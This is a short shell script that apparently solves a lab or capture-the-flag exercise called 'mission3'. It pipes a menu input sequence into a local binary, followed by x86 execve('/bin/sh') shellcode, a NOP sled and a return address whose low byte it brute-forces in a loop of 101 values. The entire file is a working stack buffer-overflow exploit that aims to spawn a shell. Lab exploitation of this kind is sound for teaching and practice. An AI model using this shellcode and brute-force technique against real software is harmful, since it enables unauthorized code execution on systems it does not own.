#!/bin/sh
for i in `seq 0 100`

do

        base=$((0x2c + $i))



        printf "0x%X - %d \n" $base $base

        HEX="$(printf '%X' $base)"

        #(python -c "print(r'\x$HEX')")

        (python -c "print('1\n2\n0\n1\n4\n-1\n'+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh3333'+'\x90'*12 +'\x$HEX'+'\xc5\xff\xff'+'\n')"; cat -) | ../mission3

done